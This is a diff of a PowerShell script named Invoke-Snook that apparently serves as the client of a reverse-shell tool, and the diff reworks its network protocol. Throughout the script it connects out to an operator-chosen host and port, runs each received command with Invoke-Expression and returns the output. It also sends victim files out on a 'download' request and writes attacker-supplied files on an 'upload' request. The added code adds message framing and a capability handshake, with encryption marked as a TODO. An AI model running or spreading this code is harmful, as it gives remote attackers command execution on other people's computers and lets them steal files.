@@ -1,3 +1,7 @@
+# TODO: Implement encryption
+# TODO: Implement interactive mode
+
+
 function Invoke-Snook
 {
     [CmdletBinding()] Param(
@@ -10,6 +14,82 @@ function Invoke-Snook
         $Port
     )
 
+
+    function DictToBytes() {
+        Param(
+            [Parameter(Mandatory=$true, Position=1)]
+            [HashTable]
+            $Dict
+        )
+
+        $message = $Dict | ConvertTo-JSON
+        return (New-Object System.Text.ASCIIEncoding).GetBytes($message)
+    }
+
+
+    function FromBase64 {
+        Param(
+            [Parameter(Mandatory=$true, Position=0)]
+            [String]
+            $Str,
+
+            [Parameter(Mandatory=$true, Position=1)]
+            [System.Text.Encoding]
+            $Encoding
+        )
+        return $Encoding.GetString([Convert]::FromBase64String($Str))
+    }
+
+
+    function GetPrompt {
+        'PS ' + (Get-Location).Path + '>'
+    }
+
+
+    function ReceiveData {
+        Param(
+            [Parameter(Mandatory=$true, Position=0)]
+            [System.Net.Sockets.NetworkStream]
+            $Stream,
+
+            [Parameter(Mandatory=$true, Position=1)]
+            [Int]
+            $Size
+        )
+
+        $buffer = New-Object System.Byte[] $Size
+        $totalBytesRead = 0
+        while ($totalBytesRead -lt $Size) {
+            $bytesRead = $tcpStream.Read($buffer, $totalBytesRead, $Size - $totalBytesRead)
+            if ($bytesRead -eq 0) {
+                return $null
+            }
+            $totalBytesRead += $bytesRead
+        }
+        return $buffer
+    }
+
+
+    function ReceivePacket {
+        Param(
+            [Parameter(Mandatory=$true, Position=0)]
+            [System.Net.Sockets.NetworkStream]
+            $Stream
+        )
+
+        $size_bytes = (ReceiveData $Stream 4)
+        if ($size_bytes -eq $null) {
+            return $null
+        }
+
+        [Array]::Reverse($size_bytes)
+        $size = [BitConverter]::ToInt32($size_bytes, 0)
+
+        $bytes = (ReceiveData $Stream $size)
+        return $bytes
+    }
+
+
     function SendPacket {
         Param(
             [Parameter(Mandatory=$true, Position=0)]
@@ -17,18 +97,17 @@ function Invoke-Snook
             $Stream,
 
             [Parameter(Mandatory=$true, Position=1)]
-            [HashTable]
-            $Dict,
-
-            [Parameter(Mandatory=$true, Position=2)]
-            [System.Text.Encoding]
-            $Encoding
+            [Byte[]]
+            $Data
         )
-        $message = $Dict | ConvertTo-JSON
-        $message = $Encoding.GetBytes($message)
-        $Stream.Write($message, 0, $message.Length)
+
+        $size = [BitConverter]::GetBytes($Data.Length)
+        [Array]::Reverse($size)
+        $Stream.Write($size, 0, $size.Length)
+        $Stream.Write($Data, 0, $Data.Length)
         $Stream.Flush()
     }
+
 
     function ToBase64 {
         Param(
@@ -40,38 +119,42 @@ function Invoke-Snook
             [System.Text.Encoding]
             $Encoding
         )
-        [Convert]::ToBase64String($Encoding.GetBytes(($InputObj | Out-String).Trim()))  
+        $str = ($InputObj | Out-String)
+        $str = $str.SubString(0, $str.Length - 2)  # Remove last line break
+        return [Convert]::ToBase64String($Encoding.GetBytes($str)) 
     }
+
 
     $tcpConnection = New-Object System.Net.Sockets.TcpClient($Hostname, $Port)
 
     $tcpStream = $tcpConnection.GetStream()
     $encoding = New-Object System.Text.UTF8Encoding
 
-    $cwd = ToBase64 (Get-Location).Path $encoding
+    $prompt = ToBase64 (GetPrompt) $encoding
     $message = @{}
-    $message.Add('cwd', $cwd)
-    SendPacket $tcpStream $message $encoding
+    $message.Add('action', 'hello')
+    $arg = @{}
+    $arg.Add('features', @('download', 'upload'))
+    $encryption = @{}
+    $encryption.Add('supported', $false)
+    $encryption.Add('enabled', $false)
+    $arg.Add('encryption', $encryption)
+    $message.Add('args', $arg)
+    $message.Add('prompt', $prompt)
+    SendPacket $tcpStream (DictToBytes $message)
 
-    $buffer = New-Object System.Byte[] 1024
+    $buffer = New-Object System.Byte[] 4096
 
     while ($tcpConnection.Connected) {
-        $data = ''
-        while (($bytesCount = $tcpStream.Read($buffer, 0, $buffer.Length)) -ne 0) {
-            $data += $encoding.GetString($buffer, 0, $bytesCount)
-            if (!$tcpConnection.DataAvailable) {
-                break
-            }
-        } 
-        
-        if ($bytesCount -eq 0) {
+        $packet = (ReceivePacket $tcpStream)
+        if ($packet -eq $null) {
             break
         }
-
-        $packet = $data | ConvertFrom-JSON
+        $packet = (New-Object System.Text.ASCIIEncoding).GetString($packet)
+        $packet = $packet | ConvertFrom-JSON
         
         if ($packet.action -eq 'cmd') {        
-            $command = $encoding.GetString([Convert]::FromBase64String($packet.args.cmd))
+            $command = FromBase64 $packet.args.cmd $encoding
             $out = Invoke-Expression -Command $command -WarningVariable warn `
                                      -ErrorVariable err 2>$null 3>$null
 
@@ -80,17 +163,16 @@ function Invoke-Snook
             if ($out) { $response.Add('message', (ToBase64 $out $encoding)) }
             if ($warn) { $response.Add('warning', (ToBase64 $warn[0] $encoding)) }
             if ($err) { $response.Add('error', (ToBase64 $err[0] $encoding)) }
-            $response.Add('cwd', (ToBase64 (Get-Location).Path $encoding))
+            $response.Add('prompt', (ToBase64 (GetPrompt) $encoding))
 
-            SendPacket $tcpStream $response $encoding
+            SendPacket $tcpStream (DictToBytes $response)
         } elseif ($packet.action -eq 'download') {
             $response = @{}
             $response.Add('action', $packet.action)
+            $path = FromBase64 $packet.args.path $encoding
 
-            if ([System.IO.Path]::IsPathRooted($packet.args.path)) {
-                $path = $packet.args.path
-            } else {
-                $path = Join-Path -Path (Get-Location).Path -ChildPath $packet.args.path
+            if (![System.IO.Path]::IsPathRooted($path)) {
+                $path = Join-Path -Path (Get-Location).Path -ChildPath $path
             }
 
             try {
@@ -106,36 +188,24 @@ function Invoke-Snook
                 $response.Add('args', $arguments)
             }
             
-            SendPacket $tcpStream $response $encoding
+            SendPacket $tcpStream (DictToBytes $response)
 
             if ($response.ContainsKey('error')) {
                 continue
             }
 
-            $data = ''
-            while ($bytesCount -ne 2) {
-                $bytesCount = $tcpStream.Read($buffer, 0, 2)
-                $data += $encoding.GetString($buffer, 0, $bytesCount)
-            }
-
-            if ($data -ne 'GO') {
-                continue
-            }
-
             while (($readBytes = $reader.Read($buffer, 0, $buffer.Length)) -ne 0) {
-                $tcpStream.Write($buffer, 0, $readBytes)
-                $tcpStream.Flush()
+                SendPacket $tcpStream $buffer[0..($readBytes - 1)]
             }
             $reader.Close()
         } elseif ($packet.action -eq 'upload') {
             $response = @{}
             $response.Add('action', $packet.action)
+            $dest = FromBase64 $packet.args.dest $encoding
 
             try {
-                if ([System.IO.Path]::IsPathRooted($packet.args.dest)) {
-                    $dest = $packet.args.dest
-                } else {
-                    $dest = Join-Path -Path (Get-Location).Path -ChildPath $packet.args.dest
+                if (![System.IO.Path]::IsPathRooted($dest)) {
+                    $dest = Join-Path -Path (Get-Location).Path -ChildPath $dest
                 }                
 
                 if ((Get-Item $dest -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo]) {
@@ -150,24 +220,34 @@ function Invoke-Snook
                 $response.Add('error', $err)
             }
 
-            SendPacket $tcpStream $response $encoding
+            SendPacket $tcpStream (DictToBytes $response)
 
             if ($response.ContainsKey('error')) {
                 continue
             }
 
             $bytesCount = 0
-            while ($bytesCount -ne $packet.args.size) {
-                $bytesRead = $tcpStream.Read($buffer, 0, $buffer.Length)
-                $writer.Write($buffer, 0, $bytesRead)
-                $bytesCount += $bytesRead
+            $err = $false
+            while ($bytesCount -ne $packet.args.size) { 
+                $data = (ReceivePacket $tcpStream)
+                if ($data -eq $null) {
+                    $err = $true
+                    break
+                }
+                $writer.Write($data, 0, $data.Length)
+                $bytesCount += $data.Length
             }
+
             $writer.Close()
+
+            if ($err) {
+                break
+            }
 
             $response = @{}
             $response.Add('action', $packet.action)
             $response.Add('message', (ToBase64 (Resolve-Path -Path $filePath).Path $encoding))
-            SendPacket $tcpStream $response $encoding
+            SendPacket $tcpStream (DictToBytes $response)
         }
     }
     $tcpConnection.Close()
